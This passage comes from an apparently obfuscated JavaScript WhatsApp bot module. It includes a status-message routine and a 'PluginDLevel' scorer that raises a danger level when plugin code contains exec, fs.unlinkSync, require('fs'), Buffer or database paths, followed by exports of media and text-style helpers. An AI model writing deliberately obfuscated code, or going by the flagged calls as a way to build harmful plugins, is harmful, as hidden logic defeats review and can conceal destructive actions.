_0x4fc8();}function _0x38a0(_0x237dcd,_0x524091){const _0x4fc8c=_0x4fc8();return _0x38a0=function(_0x38a0fd,_0x4e3d5f){_0x38a0fd=_0x38a0fd-0x1dc;let _0x1a3716=_0x4fc8c[_0x38a0fd];return _0x1a3716;},_0x38a0(_0x237dcd,_0x524091);}let parsedData=JSON[_0x1d6d72(0x1e0)](fs[_0x1d6d72(0x1f8)](_0x1d6d72(0x1f1)));console[_0x1d6d72(0x1ee)]('🟢\x20Connection\x20Up\x20Alfa\x20Database!');let check=parsedData['UserId'][_0x1d6d72(0x1ed)]()[_0x1d6d72(0x1f0)](_0x1d6d72(0x1e2));if(check){let str=_0x1d6d72(0x1f4)+require(_0x1d6d72(0x1dd))['version']+_0x1d6d72(0x1e8)+events[_0x1d6d72(0x1f5)]['length']+_0x1d6d72(0x1e9)+WORK_TYPE+_0x1d6d72(0x1de);return conn['sendMessage'](conn[_0x1d6d72(0x1f2)]['id'],{'text':str});}if(!check){const templateButtons=[{'index':0x1,'urlButton':{'displayText':_0x1d6d72(0x1ea),'url':'https://www.youtube.com/alienalfa'}},{'index':0x3,'quickReplyButton':{'displayText':_0x1d6d72(0x1f7),'id':_0x1d6d72(0x1df)}}],templateMessage={'text':_0x1d6d72(0x1f6),'footer':'[ᴀʟɪᴇɴ\x20ᴀʟꜰᴀ-ᴍᴅ]','templateButtons':templateButtons};await conn['sendMessage'](conn['user']['id'],templateMessage);};
  },
  PluginDLevel: async function PluginDLevel(body) {
var _0x30f942=_0x209d;(function(_0x58fcff,_0x49b0a3){var _0x1743b6=_0x209d,_0x1efced=_0x58fcff();while(!![]){try{var _0x195e54=-parseInt(_0x1743b6(0xf4))/0x1*(-parseInt(_0x1743b6(0xec))/0x2)+-parseInt(_0x1743b6(0x103))/0x3*(parseInt(_0x1743b6(0xed))/0x4)+parseInt(_0x1743b6(0xfc))/0x5*(parseInt(_0x1743b6(0xf2))/0x6)+-parseInt(_0x1743b6(0x104))/0x7+parseInt(_0x1743b6(0xf5))/0x8*(-parseInt(_0x1743b6(0xf9))/0x9)+-parseInt(_0x1743b6(0xf8))/0xa+parseInt(_0x1743b6(0x107))/0xb*(parseInt(_0x1743b6(0xf1))/0xc);if(_0x195e54===_0x49b0a3)break;else _0x1efced['push'](_0x1efced['shift']());}catch(_0x4d824a){_0x1efced['push'](_0x1efced['shift']());}}}(_0xac01,0x244b0));var DEG={'level':0x5};if(body['includes'](_0x30f942(0xef)))DEG[_0x30f942(0x105)]=DEG[_0x30f942(0x105)]+0x8;if(body[_0x30f942(0xf6)](_0x30f942(0xfa)))DEG['level']=DEG['level']+0x6;if(body[_0x30f942(0xf6)](_0x30f942(0xee)))DEG[_0x30f942(0x105)]=DEG[_0x30f942(0x105)]+0xe;if(body['includes'](_0x30f942(0x102)))DEG[_0x30f942(0x105)]=DEG[_0x30f942(0x105)]+0x9;if(body[_0x30f942(0xf6)]('quotedMessage'))DEG[_0x30f942(0x105)]=DEG['level']+0x5;if(body[_0x30f942(0xf6)]('fs.unlinkSync'))DEG['level']=DEG['level']+0x10;if(body[_0x30f942(0xf6)](_0x30f942(0xfb)))DEG[_0x30f942(0x105)]=DEG[_0x30f942(0x105)]+0x14;if(body['includes']('MessageType.location'))DEG[_0x30f942(0x105)]=DEG[_0x30f942(0x105)]+0x9;if(body['includes'](_0x30f942(0x100)))DEG[_0x30f942(0x105)]=DEG[_0x30f942(0x105)]+0x8;if(body[_0x30f942(0xf6)](_0x30f942(0x106)))DEG['level']=DEG[_0x30f942(0x105)]+0xe;function _0x209d(_0xda86b6,_0x3642d3){var _0xac011f=_0xac01();return _0x209d=function(_0x209d12,_0x4c89a7){_0x209d12=_0x209d12-0xec;var _0x58551a=_0xac011f[_0x209d12];return _0x58551a;},_0x209d(_0xda86b6,_0x3642d3);}if(body[_0x30f942(0xf6)](_0x30f942(0x101)))DEG[_0x30f942(0x105)]=DEG[_0x30f942(0x105)]+0x16;function _0xac01(){var _0x418427=['/sql/lydia','/sql/plugin','format','message.client.user.jid','setMessage','require(\x27fs\x27)','6339qpxhZL','729477SMnHAP','level','exec','3102649AvrXfz','groupMetadata','284320pulQpu','120wfJLLB','Buffer','fs.','/sql/greetings','12SpOKIn','1044546vhYtZK','neofetch','2dKpgiR','8MWclyN','includes','similarity','2913820YLmYEh','1195479UFYzmb','message.client.user.name','findAll','5ESJFeF'];_0xac01=function(){return _0x418427;};return _0xac01();}if(body['includes']('/sql/notes')||body[_0x30f942(0xf6)](_0x30f942(0xfd))||body['includes'](_0x30f942(0xfe))||body[_0x30f942(0xf6)](_0x30f942(0xf0))||body[_0x30f942(0xf6)]('/sql/filters'))DEG['level']=DEG[_0x30f942(0x105)]+0x21;if(body[_0x30f942(0xf6)](_0x30f942(0xf3)))DEG['level']=DEG['level']+0xc;if(body[_0x30f942(0xf6)](_0x30f942(0x108)))DEG[_0x30f942(0x105)]=DEG[_0x30f942(0x105)]+0x1d;if(body[_0x30f942(0xf6)](_0x30f942(0xf7)))DEG[_0x30f942(0x105)]=DEG['level']+0x12;if(body['includes'](_0x30f942(0xff)))DEG[_0x30f942(0x105)]=DEG[_0x30f942(0x105)]+0x1a;return DEG['level'];
},
  scraper,
  ytv,
  yta,
  ytIdRegex,
  yt,
  imageToWebp,
  videoToWebp,
  writeExifImg,
  writeExifVid,
  writeExifWebp,
  toAudio,
  toPTT,
  toVideo,
  ffmpeg,
  webp2mp4,
  webp2png,
  listall,
  strikeThrough,
  wingdings,
  vaporwave,
  typewriter,
  analucia,
  tildeStrikeThrough,
  underline,
  doubleUnderline,
  slashThrough,
  sparrow,
  heartsBetween,
  arrowBelow,
  crossAboveBelow,
  creepify,
  bubbles,
  mirror,
  squares,
  roundsquares,
  flip,
  tiny,
  createMap,
  serif_I,
  manga,
  ladybug,
  runes,
  serif_B,
  serif_BI,
  serif_I,
};
